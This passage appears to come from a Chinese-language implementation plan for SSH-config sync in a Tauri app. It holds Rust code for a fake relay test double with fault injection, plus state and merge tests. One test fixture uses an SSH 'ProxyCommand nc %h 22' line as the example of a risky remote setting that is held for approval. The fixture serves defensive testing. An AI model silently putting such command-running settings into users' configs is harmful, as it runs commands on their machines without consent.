  - `pub fn space_key_slot(account_keys: &ChainKeys, space_id: &str) -> String`;`pub fn space_keys(account: &AccountState, account_keys: &ChainKeys, space_id: &str) -> Option<ChainKeys>`;
    `pub fn space_deleted_by(account: &AccountState, account_keys: &ChainKeys, space_id: &str) -> Option<String>`
  - `pub fn devices(account: &AccountState) -> Vec<(String, DevicePayload)>`;`pub fn device_name(account: &AccountState, device_id: &str) -> String`
  - `pub fn put_account_record(account: &mut AccountState, kind: RecordKind, id: &str, payload: Value, deleted: bool, device_id: &str, now_ms: u64)`
  - `pub fn put_space_key(account: &mut AccountState, account_keys: &ChainKeys, space_id: &str, space_keys: Option<&ChainKeys>, device_id: &str, now_ms: u64) -> Result<(), AppError>`(`None` = tombstone)
  - `pub fn own_device_record(account: &AccountState, device_id: &str, device_name: &str, platform: &str, spaces: &[String], now_ms: u64) -> Record`;
    `pub fn plan_device(account: &mut AccountState, device_id: &str, device_name: &str, platform: &str, spaces: &[String], now_ms: u64) -> bool`
  - `pub struct AccountMerged { pub section: AccountState, pub markers: Vec<RotationMarkerPayload>, pub skipped: u32 }`;
    `pub fn merge_account(section: &AccountState, keys: &ChainKeys, pulled: &PullResponse) -> AccountMerged`
  - `pub struct Outgoing { pub key: String, pub item: PushItem, pub version: u64, pub updated_at_ms: u64 }`;
    `pub fn space_outgoing(section: &SpaceState, keys: &ChainKeys) -> Result<Vec<Outgoing>, AppError>`;
    `pub fn account_outgoing(section: &AccountState, keys: &ChainKeys) -> Result<Vec<Outgoing>, AppError>`
  - `pub struct Pushed { pub accepted: Vec<(String, u64)>, pub conflicts: usize, pub frozen: bool }`;
    `pub fn push_outgoing(relay: &dyn RelayApi, chain_id: &str, token: &str, outgoing: &[Outgoing]) -> Result<Pushed, RelayError>`
  - `pub fn apply_pushed_space(section: &mut SpaceState, outgoing: &[Outgoing], pushed: &Pushed)`;
    `pub fn apply_pushed_account(section: &mut AccountState, outgoing: &[Outgoing], pushed: &Pushed)`
  - `pub fn selected_include_tokens(account: Option<&AccountState>, spaces: &BTreeMap<String, SpaceState>) -> Result<Vec<String>, AppError>`
- Produces(`fake_relay`,只在測試):`FakeRelay::new() -> Arc<FakeRelay>`;注入:`set_legacy`、`set_offline`、
  `set_budget(Option<usize>)`、`set_rate_limited(chain, bool)`、`fail_batches_with_429(n)`、`fail_batches_with_5xx(n)`、
  `set_broken(chain, bool)`、`fail_pushes_with_429(n)`、`fail_creates_with_429(n)`;觀察:`exists`、`is_frozen`、`rows`、
  `calls`、`clear_calls`、`roll_back(chain, keep)`;`impl RelayApi for FakeRelay`(和 `RelayClient` 一樣在送出前拒絕空的、
  超過 200 筆、重複 `id_hash` 的 push 與超出 safe integer 的 cursor:`InvalidRequest`);
  `pub fn connect(relay: &Arc<FakeRelay>, base_url: &str) -> Result<Box<dyn RelayApi>, AppError>`。

- [ ] **Step 1: 測試設施 `src-tauri/src/sync/fake_relay.rs`**

`FakeRelay` 是測試替身,整個檔案在這一步寫好(它自己的語意測試在檔尾)。

建立 `src-tauri/src/sync/fake_relay.rs`:

```rust
//! 記憶體假 relay(只在測試建置):語意與 relay Worker 相同 —— 每條 chain 一個權杖、單調 seq、base_seq 過舊回
//! conflict、凍結後 push 一律 `Frozen`、批次查詢逐項回 `ok` / `not_found` / `rate_limited` / `deferred`。多台裝置的
//! 引擎共用同一個實例,測試就能決定性地重現兩台同時升級、更換同步碼時第三台還在推送等情境。另外可以注入:舊版 relay
//! (沒有批次查詢與凍結)、離線、批次的回應預算(第幾項之後 deferred)、單條 chain 的限流、整批 `429`、上傳與建立
//! chain 的 `429`。

use std::collections::{BTreeMap, BTreeSet};
use std::sync::{Arc, Mutex};

use crate::error::AppError;
use crate::sync::crypto::is_chain_id;
use crate::sync::record::Envelope;
use crate::sync::relay::{
    BatchPullEntry, BatchPullItem, BatchPullResult, PullResponse, PushItem, PushOutcome, PushResult, RelayApi,
    RelayError, RelayInfo, FEATURE_FREEZE, FEATURE_PULL_BATCH, MAX_BATCH_PULL,
};

#[derive(Default)]
struct FakeChain {
    token: String,
    rows: BTreeMap<String, Envelope>,
    latest: u64,
    frozen: bool,
}

#[derive(Default)]
struct Inner {
    chains: BTreeMap<String, FakeChain>,
    legacy: bool,
    offline: bool,
    /// 批次查詢每次最多執行幾項,其餘回 `deferred`(第一項一律執行,同 relay 的預算規則)。
    budget: Option<usize>,
    rate_limited: BTreeSet<String>,
    batch_429: u32,
    batch_5xx: u32,
    create_429: u32,
    push_429: u32,
    /// 這些 chain 的 Durable Object 會丟例外:單條查詢回 `500`,含它的批次整批 `500`(relay 不逐項 catch)。
    broken: BTreeSet<String>,
    calls: Vec<String>,
}

pub struct FakeRelay {
    inner: Mutex<Inner>,
}

fn short(chain: &str) -> &str {
    &chain[..chain.len().min(8)]
}

impl FakeRelay {
    pub fn new() -> Arc<Self> {
        Arc::new(Self { inner: Mutex::new(Inner::default()) })
    }

    /// 舊版 relay:`GET /v1/info` 404(沒有任何功能)、`POST /v1/pull` 404、freeze 404。
    pub fn set_legacy(&self, legacy: bool) {
        self.inner.lock().unwrap().legacy = legacy;
    }

    /// 連不上:每個呼叫都回 `Unreachable`。
    pub fn set_offline(&self, offline: bool) {
        self.inner.lock().unwrap().offline = offline;
    }

    /// 批次查詢每次只執行前 `items` 項,其餘 `deferred`。
    pub fn set_budget(&self, items: Option<usize>) {
        self.inner.lock().unwrap().budget = items;
    }

    /// 這條 chain 在批次裡回 `rate_limited`、單條 pull 回 `429`。
    pub fn set_rate_limited(&self, chain: &str, limited: bool) {
        let mut inner = self.inner.lock().unwrap();
        if limited {
            inner.rate_limited.insert(chain.to_string());
        } else {
            inner.rate_limited.remove(chain);
        }
    }

    /// 接下來 `times` 次批次查詢整批回 `429`。
    pub fn fail_batches_with_429(&self, times: u32) {
        self.inner.lock().unwrap().batch_429 = times;
    }

    /// 接下來 `times` 次批次查詢整批回 `500`。
    pub fn fail_batches_with_5xx(&self, times: u32) {
        self.inner.lock().unwrap().batch_5xx = times;
    }

    /// 這條 chain 壞掉(或修好):單條查詢回 `500`,含它的批次整批 `500`。
    pub fn set_broken(&self, chain: &str, broken: bool) {
        let mut inner = self.inner.lock().unwrap();
        if broken {
            inner.broken.insert(chain.to_string());
        } else {
            inner.broken.remove(chain);
        }
    }

    /// 接下來 `times` 次上傳回 `429`。
    pub fn fail_pushes_with_429(&self, times: u32) {
        self.inner.lock().unwrap().push_429 = times;
    }

    /// 接下來 `times` 次建立 chain 回 `429`(每 IP 每小時 20 次建立)。
    pub fn fail_creates_with_429(&self, times: u32) {
        self.inner.lock().unwrap().create_429 = times;
    }

    pub fn exists(&self, chain: &str) -> bool {
        self.inner.lock().unwrap().chains.contains_key(chain)
    }

    pub fn is_frozen(&self, chain: &str) -> bool {
        self.inner.lock().unwrap().chains.get(chain).is_some_and(|c| c.frozen)
    }

    /// chain 上的列(依 seq 排序);chain 不存在 → 空。
    pub fn rows(&self, chain: &str) -> Vec<Envelope> {
        let inner = self.inner.lock().unwrap();
        let mut rows: Vec<Envelope> = inner.chains.get(chain).map(|c| c.rows.values().cloned().collect()).unwrap_or_default();
        rows.sort_by_key(|e| e.seq);
        rows
    }

    /// 呼叫紀錄:`info`、`create:<id8>`、`delete:<id8>`、`freeze:<id8>`、`pull:<id8>`、`push:<id8>`、
    /// `batch:<id8>,<id8>,…`(依請求順序)。
    pub fn calls(&self) -> Vec<String> {
        self.inner.lock().unwrap().calls.clone()
    }

    pub fn clear_calls(&self) {
        self.inner.lock().unwrap().calls.clear();
    }

    /// 自架 relay 從舊備份還原:只留 seq ≤ `keep` 的列,watermark 退回 `keep`。
    pub fn roll_back(&self, chain: &str, keep: u64) {
        let mut inner = self.inner.lock().unwrap();
        if let Some(c) = inner.chains.get_mut(chain) {
            c.rows.retain(|_, e| e.seq <= keep);
            c.latest = keep;
        }
    }

    fn pull_chain(inner: &Inner, chain: &str, token: &str, since: u64) -> Result<PullResponse, RelayError> {
        if inner.broken.contains(chain) {
            return Err(RelayError::Http(500));
        }
        let c = inner.chains.get(chain).filter(|c| c.token == token).ok_or(RelayError::NotFound)?;
        if inner.rate_limited.contains(chain) {
            return Err(RelayError::RateLimited);
        }
        let mut records: Vec<Envelope> = c.rows.values().filter(|e| e.seq > since).cloned().collect();
        records.sort_by_key(|e| e.seq);
        Ok(PullResponse { records, latest_seq: c.latest })
    }
}

fn check(chain: &str, token: &str) -> Result<(), RelayError> {
    if is_chain_id(chain) && is_chain_id(token) {
        Ok(())
    } else {
        Err(RelayError::InvalidRequest("chain id and token must be 64 lowercase hex characters".to_string()))
    }
}

/// 與 `RelayClient` 送出前的檢查相同(relay 的上限):每次 push 1–200 筆、同一批裡沒有重複的 `id_hash`。引擎若送出
/// 違規的請求,測試會看到和真 client 一樣的 `InvalidRequest`。
const MAX_PUSH_ITEMS: usize = 200;
/// cursor 是 JavaScript 的 safe integer(2^53 − 1),同 `RelayClient`。
const MAX_SAFE_INTEGER: u64 = 9_007_199_254_740_991;

fn check_push(items: &[PushItem]) -> Result<(), RelayError> {
    if items.is_empty() || items.len() > MAX_PUSH_ITEMS {
        return Err(RelayError::InvalidRequest(format!("a push takes 1 to {MAX_PUSH_ITEMS} records")));
    }
    let mut seen = BTreeSet::new();
    if !items.iter().all(|item| seen.insert(item.id_hash.as_str())) {
        return Err(RelayError::InvalidRequest("a record appears twice in one push".to_string()));
    }
    Ok(())
}

fn check_cursor(since: u64) -> Result<(), RelayError> {
    if since > MAX_SAFE_INTEGER {
        return Err(RelayError::InvalidRequest("a pull cursor is out of range".to_string()));
    }
    Ok(())
}

impl RelayApi for FakeRelay {
    fn info(&self) -> Result<RelayInfo, RelayError> {
        let mut inner = self.inner.lock().unwrap();
        inner.calls.push("info".to_string());
        if inner.offline {
            return Err(RelayError::Unreachable("offline".to_string()));
        }
        if inner.legacy {
            return Ok(RelayInfo::default());
        }
        Ok(RelayInfo { version: Some("0.2.0".to_string()), features: vec![FEATURE_PULL_BATCH.to_string(), FEATURE_FREEZE.to_string()] })
    }

    fn create_chain(&self, chain_id: &str, token: &str) -> Result<(), RelayError> {
        check(chain_id, token)?;
        let mut inner = self.inner.lock().unwrap();
        inner.calls.push(format!("create:{}", short(chain_id)));
        if inner.offline {
            return Err(RelayError::Unreachable("offline".to_string()));
        }
        if inner.create_429 > 0 {
            inner.create_429 -= 1;
            return Err(RelayError::RateLimited);
        }
        match inner.chains.get(chain_id) {
            Some(c) if c.token == token => Ok(()),
            Some(_) => Err(RelayError::NotFound),
            None => {
                inner.chains.insert(chain_id.to_string(), FakeChain { token: token.to_string(), ..FakeChain::default() });
                Ok(())
            }
        }
    }

    fn delete_chain(&self, chain_id: &str, token: &str) -> Result<(), RelayError> {
        check(chain_id, token)?;
        let mut inner = self.inner.lock().unwrap();
        inner.calls.push(format!("delete:{}", short(chain_id)));
        if inner.offline {
            return Err(RelayError::Unreachable("offline".to_string()));
        }
        match inner.chains.get_mut(chain_id) {
            // 凍結的 chain:刪掉記錄但維持凍結(之後 `PUT` 回 200、push 照樣 409),還沒換同步碼的電腦仍會被擋下。
            Some(c) if c.token == token && c.frozen => {
                c.rows.clear();
                Ok(())
            }
            Some(c) if c.token == token => {
                inner.chains.remove(chain_id);
                Ok(())
            }
            _ => Err(RelayError::NotFound),
        }
    }

    fn freeze_chain(&self, chain_id: &str, token: &str) -> Result<(), RelayError> {
        check(chain_id, token)?;
        let mut inner = self.inner.lock().unwrap();
        inner.calls.push(format!("freeze:{}", short(chain_id)));
        if inner.offline {
            return Err(RelayError::Unreachable("offline".to_string()));
        }
        if inner.legacy {
            return Err(RelayError::NotFound);
        }
        match inner.chains.get_mut(chain_id) {
            Some(c) if c.token == token => {
                c.frozen = true;
                Ok(())
            }
            _ => Err(RelayError::NotFound),
        }
    }

    fn pull(&self, chain_id: &str, token: &str, since: u64) -> Result<PullResponse, RelayError> {
        check(chain_id, token)?;
        check_cursor(since)?;
        let mut inner = self.inner.lock().unwrap();
        inner.calls.push(format!("pull:{}", short(chain_id)));
        if inner.offline {
            return Err(RelayError::Unreachable("offline".to_string()));
        }
        Self::pull_chain(&inner, chain_id, token, since)
    }

    fn pull_batch(&self, items: &[BatchPullItem]) -> Result<Vec<BatchPullEntry>, RelayError> {
        if items.is_empty() {
            return Ok(Vec::new());
        }
        let mut inner = self.inner.lock().unwrap();
        inner.calls.push(format!("batch:{}", items.iter().map(|i| short(&i.chain)).collect::<Vec<_>>().join(",")));
        if inner.offline {
            return Err(RelayError::Unreachable("offline".to_string()));
        }
        if inner.legacy {
            return Err(RelayError::Unsupported(FEATURE_PULL_BATCH));
        }
        let mut seen = BTreeSet::new();
        if items.len() > MAX_BATCH_PULL {
            return Err(RelayError::InvalidRequest("too many chains".to_string()));
        }
        for item in items {
            check(&item.chain, &item.token)?;
            check_cursor(item.since)?;
            if !seen.insert(item.chain.as_str()) {
                return Err(RelayError::InvalidRequest("duplicate chain".to_string()));
            }
        }
        if inner.batch_429 > 0 {
            inner.batch_429 -= 1;
            return Err(RelayError::RateLimited);
        }
        if inner.batch_5xx > 0 || items.iter().any(|i| inner.broken.contains(&i.chain)) {
            inner.batch_5xx = inner.batch_5xx.saturating_sub(1);
            return Err(RelayError::Http(500));
        }
        Ok(items
            .iter()
            .enumerate()
            .map(|(i, item)| {
                let result = if inner.budget.is_some_and(|n| i >= n.max(1)) {
                    BatchPullResult::Deferred
                } else {
                    match Self::pull_chain(&inner, &item.chain, &item.token, item.since) {
                        Ok(resp) => BatchPullResult::Ok(resp),
                        Err(RelayError::RateLimited) => BatchPullResult::RateLimited,
                        Err(_) => BatchPullResult::NotFound,
                    }
                };
                BatchPullEntry { chain: item.chain.clone(), result }
            })
            .collect())
    }

    fn push(&self, chain_id: &str, token: &str, items: &[PushItem]) -> Result<PushOutcome, RelayError> {
        check(chain_id, token)?;
        check_push(items)?;
        let mut inner = self.inner.lock().unwrap();
        inner.calls.push(format!("push:{}", short(chain_id)));
        if inner.offline {
            return Err(RelayError::Unreachable("offline".to_string()));
        }
        if inner.push_429 > 0 {
            inner.push_429 -= 1;
            return Err(RelayError::RateLimited);
        }
        let c = inner.chains.get_mut(chain_id).filter(|c| c.token == token).ok_or(RelayError::NotFound)?;
        if c.frozen {
            return Ok(PushOutcome::Frozen);
        }
        let mut out = Vec::new();
        for item in items {
            if let Some(current) = c.rows.get(&item.id_hash) {
                if current.seq > item.base_seq {
                    out.push(PushResult::Conflict { current: current.clone() });
                    continue;
                }
            }
            c.latest += 1;
            let seq = c.latest;
            c.rows.insert(
                item.id_hash.clone(),
                Envelope {
                    id_hash: item.id_hash.clone(),
                    kind: item.kind.clone(),
                    seq,
                    nonce: item.nonce.clone(),
                    ciphertext: item.ciphertext.clone(),
                    deleted: item.deleted,
                },
            );
            out.push(PushResult::Accepted { seq });
        }
        Ok(PushOutcome::Applied(out))
    }
}

/// `RelayConnector` 給引擎的 relay(測試裡所有裝置共用同一個 `FakeRelay`)。
pub struct FakeRelayHandle(pub Arc<FakeRelay>);

impl RelayApi for FakeRelayHandle {
    fn info(&self) -> Result<RelayInfo, RelayError> {
        self.0.info()
    }
    fn create_chain(&self, chain_id: &str, token: &str) -> Result<(), RelayError> {
        self.0.create_chain(chain_id, token)
    }
    fn delete_chain(&self, chain_id: &str, token: &str) -> Result<(), RelayError> {
        self.0.delete_chain(chain_id, token)
    }
    fn freeze_chain(&self, chain_id: &str, token: &str) -> Result<(), RelayError> {
        self.0.freeze_chain(chain_id, token)
    }
    fn pull(&self, chain_id: &str, token: &str, since: u64) -> Result<PullResponse, RelayError> {
        self.0.pull(chain_id, token, since)
    }
    fn pull_batch(&self, items: &[BatchPullItem]) -> Result<Vec<BatchPullEntry>, RelayError> {
        self.0.pull_batch(items)
    }
    fn push(&self, chain_id: &str, token: &str, items: &[PushItem]) -> Result<PushOutcome, RelayError> {
        self.0.push(chain_id, token, items)
    }
}

/// relay URL 沒設定時同 production:拒絕。
pub fn connect(relay: &Arc<FakeRelay>, base_url: &str) -> Result<Box<dyn RelayApi>, AppError> {
    if base_url.trim().is_empty() {
        return Err(AppError::Other("no relay URL".to_string()));
    }
    Ok(Box::new(FakeRelayHandle(Arc::clone(relay))))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn hex(c: char) -> String {
        c.to_string().repeat(64)
    }

    fn item(id: &str, base: u64) -> PushItem {
        PushItem { id_hash: id.to_string(), kind: "host".into(), nonce: "n".into(), ciphertext: "c".into(), deleted: false, base_seq: base }
    }

    #[test]
    fn the_fake_relay_follows_the_worker_rules() {
        let relay = FakeRelay::new();
        let (a, b, t, other) = (hex('a'), hex('b'), hex('1'), hex('2'));
        relay.create_chain(&a, &t).unwrap();
        relay.create_chain(&a, &t).unwrap(); // 已存在、權杖相符:Ok
        assert!(matches!(relay.create_chain(&a, &other), Err(RelayError::NotFound)));
        assert!(matches!(relay.pull(&a, &other, 0), Err(RelayError::NotFound)), "a wrong token looks like a missing chain");
        // push:新列接受;base_seq 過舊 → conflict。
        assert_eq!(relay.push(&a, &t, &[item("h1", 0)]).unwrap(), PushOutcome::Applied(vec![PushResult::Accepted { seq: 1 }]));
        assert!(matches!(&relay.push(&a, &t, &[item("h1", 0)]).unwrap(), PushOutcome::Applied(r) if matches!(r[0], PushResult::Conflict { .. })));
        assert_eq!(relay.push(&a, &t, &[item("h1", 1)]).unwrap(), PushOutcome::Applied(vec![PushResult::Accepted { seq: 2 }]));
        assert_eq!(relay.pull(&a, &t, 0).unwrap().latest_seq, 2);
        // 和真 client 一樣在送出前拒絕:空的、超過 200 筆、同一批重複的 push;超出 safe integer 的 cursor。
        assert!(matches!(relay.push(&a, &t, &[]), Err(RelayError::InvalidRequest(_))));
        assert!(matches!(relay.push(&a, &t, &[item("h5", 0), item("h5", 0)]), Err(RelayError::InvalidRequest(_))));
        let many: Vec<PushItem> = (0..201).map(|i| item(&format!("m{i}"), 0)).collect();
        assert!(matches!(relay.push(&a, &t, &many), Err(RelayError::InvalidRequest(_))));
        assert!(matches!(relay.pull(&a, &t, MAX_SAFE_INTEGER + 1), Err(RelayError::InvalidRequest(_))));
        let past = vec![BatchPullItem { chain: a.clone(), token: t.clone(), since: MAX_SAFE_INTEGER + 1 }];
        assert!(matches!(relay.pull_batch(&past), Err(RelayError::InvalidRequest(_))));
        assert_eq!(relay.pull(&a, &t, 0).unwrap().latest_seq, 2, "nothing was written");
        // 批次:not_found、rate_limited、deferred(預算)。
        relay.create_chain(&b, &t).unwrap();
        relay.set_rate_limited(&b, true);
        let batch = |since| vec![
            BatchPullItem { chain: a.clone(), token: t.clone(), since },
            BatchPullItem { chain: b.clone(), token: t.clone(), since },
            BatchPullItem { chain: hex('c'), token: t.clone(), since },
        ];
        let entries = relay.pull_batch(&batch(0)).unwrap();
        assert!(matches!(&entries[0].result, BatchPullResult::Ok(r) if r.records.len() == 1));
        assert_eq!(entries[1].result, BatchPullResult::RateLimited);
        assert_eq!(entries[2].result, BatchPullResult::NotFound);
        relay.set_budget(Some(1));
        let entries = relay.pull_batch(&batch(0)).unwrap();
        assert!(matches!(entries[0].result, BatchPullResult::Ok(_)));
        assert_eq!((entries[1].result.clone(), entries[2].result.clone()), (BatchPullResult::Deferred, BatchPullResult::Deferred));
        relay.set_budget(None);
        relay.fail_batches_with_429(1);
        assert!(matches!(relay.pull_batch(&batch(0)), Err(RelayError::RateLimited)));
        assert!(relay.pull_batch(&batch(0)).is_ok());
        // 凍結:push 一律 Frozen、不寫入;pull 照常。刪除凍結的 chain 只清掉記錄,它仍然凍結:之後 `PUT` 照樣成功
        // (200,不是一條新的可寫 chain)、push 仍是 Frozen。沒凍結的 chain 刪除後重建就是全新的。
        relay.freeze_chain(&a, &t).unwrap();
        assert_eq!(relay.push(&a, &t, &[item("h2", 0)]).unwrap(), PushOutcome::Frozen);
        assert_eq!(relay.rows(&a).len(), 1);
        relay.delete_chain(&a, &t).unwrap();
        assert!(relay.rows(&a).is_empty() && relay.is_frozen(&a));
        relay.create_chain(&a, &t).unwrap();
        assert_eq!(relay.push(&a, &t, &[item("h3", 0)]).unwrap(), PushOutcome::Frozen);
        let fresh = hex('d');
        relay.create_chain(&fresh, &t).unwrap();
        relay.delete_chain(&fresh, &t).unwrap();
        assert!(!relay.exists(&fresh));
        // 壞掉的 chain:單條 500,含它的批次整批 500。
        relay.set_broken(&b, true);
        assert!(matches!(relay.pull(&b, &t, 0), Err(RelayError::Http(500))));
        relay.set_rate_limited(&b, false);
        assert!(matches!(relay.pull_batch(&batch(0)), Err(RelayError::Http(500))));
        relay.set_broken(&b, false);
        relay.fail_batches_with_5xx(1);
        assert!(matches!(relay.pull_batch(&batch(0)), Err(RelayError::Http(500))));
        assert!(relay.pull_batch(&batch(0)).is_ok());
        // 舊版 relay:沒有批次查詢與凍結。
        relay.set_legacy(true);
        assert_eq!(relay.info().unwrap(), RelayInfo::default());
        assert!(matches!(relay.pull_batch(&batch(0)), Err(RelayError::Unsupported(_))));
        assert!(matches!(relay.freeze_chain(&b, &t), Err(RelayError::NotFound)));
        assert!(relay.calls().iter().any(|c| c.starts_with("batch:aaaaaaaa,bbbbbbbb,cccccccc")));
    }
}
```

- [ ] **Step 2: `src-tauri/src/sync/state_v2.rs` 的測試**

降版安全:較新版本寫的提示種類不能讓整份狀態檔讀不懂。

`src-tauri/src/sync/state_v2.rs`:把

```rust

    #[test]
    fn a_v1_state_file_is_reported_as_legacy_not_parsed_into_v2() {
        let dir = tempfile::tempdir().unwrap();
```

換成:

```rust

    #[test]
    fn notices_of_a_kind_this_version_does_not_know_are_skipped_not_fatal() {
        // 較新版本寫的提示種類(或讀不懂的一則):降版之後狀態檔照樣讀得回來,只略過那幾則。
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("sync-state.json");
        let mut json = serde_json::to_value(SyncStateV2::fresh("A").unwrap()).unwrap();
        json["notices"] = serde_json::json!([
            { "kind": "from_a_newer_version", "detail": 1 },
            { "kind": "new_sync_code" },
            { "kind": "space_deleted", "name": "Work" }
        ]);
        std::fs::write(&path, serde_json::to_vec(&json).unwrap()).unwrap();
        match load(&path).unwrap() {
            LoadedState::Current(back) => assert_eq!(back.notices, vec![SyncNotice::NewSyncCode]),
            other => panic!("expected a v2 state, got {other:?}"),
        }
    }

    #[test]
    fn a_v1_state_file_is_reported_as_legacy_not_parsed_into_v2() {
        let dir = tempfile::tempdir().unwrap();
```

- [ ] **Step 3: 寫失敗的測試:`src-tauri/src/sync/merge.rs`**

建立 `src-tauri/src/sync/merge.rs`,先只放 module 註解、`use` 與測試(實作在後面的步驟加入):

```rust
//! Sync v2 的記錄層(spec §7.1、§7.4):帳戶與 space 區段各自的本機 diff、合併與上傳。純函式 —— 不碰檔案與
//! Tauri;網路只在 `push_outgoing`(經 `RelayApi`)。規則沿用 v1 `reconcile`:記錄層級 LWW、cursor 只跟 pull 的
//! watermark、解不開或格式不對的遠端記錄略過且不進快取、watermark 倒退就整份重傳。v2 多了:帳戶記錄依
//! `RecordKind::is_secret` 分流到明文 `records` 與密文 `sealed`、更換標記的偵測、危險設定的保留待核准。

use serde_json::Value;

use crate::error::AppError;
use crate::sync::approval::{needs_approval, signature};
use crate::sync::crypto::{id_hash, is_chain_id, ChainKeys};
use crate::sync::hosts_file::{is_syncable_alias, validate_host_text, HostBlockText};
use crate::sync::planner::{detect_local_changes, next_timestamp};
use crate::sync::reconcile::{decode, encode, HostEffect};
use crate::sync::record::{
    merge, record_key, rotation_marker_device, DevicePayload, HostPayload, LocalRecord, MergeOutcome, MetaPayload,
    Record, RecordKind, RotationMarkerPayload, SpaceKeyPayload, SpacePayload, ACCOUNT_META_ID, SCHEMA_VERSION,
};
use crate::sync::relay::{PullResponse, PushItem, PushOutcome, PushResult, RelayApi, RelayError};
use crate::sync::space_files::include_tokens;
use crate::sync::state_v2::{sealed_key, AccountState, DeclinedVersion, PendingApproval, SealedRecord, SpaceState};

#[cfg(test)]
mod tests {
    use super::*;
    use crate::sync::fake_relay::FakeRelay;
    use crate::sync::record::{rotation_meta_id, Envelope};

    fn keys() -> ChainKeys {
        ChainKeys::generate().unwrap()
    }

    fn block(alias: &str, text: &str) -> HostBlockText {
        HostBlockText { alias: alias.to_string(), text: text.to_string() }
    }

    fn host(alias: &str, text: Option<&str>, updated_at_ms: u64, device: &str) -> Record {
        Record {
            kind: RecordKind::Host,
            id: alias.to_string(),
            version: 1,
            updated_at_ms,
            device_id: device.to_string(),
            deleted: text.is_none(),
            payload: text.map_or(Value::Null, |t| serde_json::json!({ "schema": 1, "text": t })),
        }
    }

    /// 一批「relay 上的」記錄:依序給 seq 1、2、3……
    fn pulled(keys: &ChainKeys, records: &[Record], latest: u64) -> PullResponse {
        let records = records
            .iter()
            .enumerate()
            .map(|(i, r)| {
                let item = encode(keys, r, 0).unwrap();
                Envelope {
                    id_hash: item.id_hash,
                    kind: item.kind,
                    seq: i as u64 + 1,
                    nonce: item.nonce,
                    ciphertext: item.ciphertext,
                    deleted: item.deleted,
                }
            })
            .collect();
        PullResponse { records, latest_seq: latest }
    }

    fn name_of(id: &str) -> String {
        format!("name-of-{id}")
    }

    const PROXY: &str = "Host web\n  ProxyCommand nc %h 22\n";

    #[test]
    fn local_edits_become_dirty_records_with_their_own_change_times() {
        let mut space = SpaceState::new("work-3fa2c1d9.config");
        assert_eq!(plan_hosts(&mut space, &[block("web", "Host web\n"), block("db", "Host db\n")], "dev-a", |a| if a == "web" { 100 } else { 300 }), 2);
        assert_eq!(space.records["host:web"].record.updated_at_ms, 100);
        assert_eq!(space.records["host:db"].record.updated_at_ms, 300);
        assert!(space.records.values().all(|l| l.dirty && l.seq == 0));
        // 不變就不產生;消失 → tombstone 一次。
        assert_eq!(plan_hosts(&mut space, &[block("web", "Host web\n"), block("db", "Host db\n")], "dev-a", |_| 400), 0);
        assert_eq!(plan_hosts(&mut space, &[block("web", "Host web\n")], "dev-a", |_| 500), 1);
        assert!(space.records["host:db"].record.deleted);
        assert_eq!(plan_hosts(&mut space, &[block("web", "Host web\n")], "dev-a", |_| 600), 0);
    }

    #[test]
    fn a_pending_or_declined_remote_version_is_the_base_for_the_next_local_edit() {
        let k = keys();
        let mut space = SpaceState::new("work-3fa2c1d9.config");
        let mut local = host("web", Some("Host web\n"), 100, "dev-a");
        local.version = 2;
        space.records.insert("host:web".into(), LocalRecord { record: local, seq: 3, dirty: false });
        // 別台把 web 改成含 ProxyCommand(時間 900):保留待核准,seq 7。
        let mut remote = host("web", Some(PROXY), 900, "dev-b");
        remote.version = 5;
        let mut p = pulled(&k, &[remote], 7);
        p.records[0].seq = 7;
        let merged = merge_space(&space, &k, &p, &[block("web", "Host web\n")], name_of);
        assert_eq!(merged.held, vec!["web".to_string()]);
        let mut space = merged.section;
        // 本機時鐘落後(時間 200)時改了 web:新版本仍要排在待核准的版本之後,以它的 seq 為 base。
        assert_eq!(plan_hosts(&mut space, &[block("web", "Host web\n  User me\n")], "dev-a", |_| 200), 1);
        let planned = &space.records["host:web"];
        assert_eq!(planned.record.version, 6);
        assert_eq!(planned.record.updated_at_ms, 901);
        assert_eq!(planned.seq, 7);
        assert!(space.pending_approvals.is_empty(), "a newer local edit supersedes the pending version");
        // 拒絕過的版本(本機沒有這台主機)也一樣:之後在本機建立它,以拒絕的版本為基準。
        let mut fresh = SpaceState::new("work-3fa2c1d9.config");
        fresh.declined.insert("db".into(), DeclinedVersion { version: 4, updated_at_ms: 800, seq: 9 });
        assert_eq!(plan_hosts(&mut fresh, &[], "dev-a", |_| 100), 0, "a declined version alone plans nothing");
        assert_eq!(plan_hosts(&mut fresh, &[block("db", "Host db\n")], "dev-a", |_| 100), 1);
        let planned = &fresh.records["host:db"];
        assert_eq!((planned.record.version, planned.record.updated_at_ms, planned.seq), (5, 801, 9));
        assert!(!planned.record.deleted);
        assert!(fresh.declined.is_empty());
    }

    #[test]
    fn remote_hosts_merge_by_lww_and_report_lost_local_edits() {
        let k = keys();
        let mut space = SpaceState::new("work-3fa2c1d9.config");
        space.records.insert("host:web".into(), LocalRecord { record: host("web", Some("Host web\n  User a\n"), 100, "dev-a"), seq: 1, dirty: true });
        space.records.insert("host:db".into(), LocalRecord { record: host("db", Some("Host db\n"), 500, "dev-a"), seq: 2, dirty: true });
        space.records.insert("host:old".into(), LocalRecord { record: host("old", Some("Host old\n"), 50, "dev-a"), seq: 3, dirty: false });
        let p = pulled(
            &k,
            &[
                host("web", Some("Host web\n  User b\n"), 200, "dev-b"), // 遠端較新,本機有未上傳的修改 → 衝突
                host("db", Some("Host db\n  User b\n"), 400, "dev-b"),   // 本機較新 → 保留本機、更新 seq
                host("old", None, 60, "dev-b"),                          // 遠端刪除
                host("new", Some("Host new\n"), 70, "dev-b"),
            ],
            4,
        );
        let m = merge_space(&space, &k, &p, &[], name_of);
        assert_eq!(m.conflicts, vec!["web".to_string()]);
        assert_eq!(
            m.effects,
            vec![
                HostEffect::Upsert { alias: "web".into(), text: "Host web\n  User b\n".into() },
                HostEffect::Delete { alias: "old".into() },
                HostEffect::Upsert { alias: "new".into(), text: "Host new\n".into() },
            ]
        );
        assert!(!m.section.records["host:web"].dirty);
        assert!(m.section.records["host:db"].dirty);
        assert_eq!(m.section.records["host:db"].seq, 2, "the relay's seq for db");
        assert_eq!(m.section.cursor_seq, 4);
        // 只為重新上傳才 dirty 的記錄(v1 升級)輸了不算衝突。
        space.republish.insert("host:web".into());
        let quiet = merge_space(&space, &k, &p, &[], name_of);
        assert!(quiet.conflicts.is_empty());
        assert!(!quiet.section.republish.contains("host:web"));
    }

    #[test]
    fn risky_remote_changes_are_held_for_approval_and_never_applied_or_cached() {
        let k = keys();
        let space = SpaceState::new("work-3fa2c1d9.config");
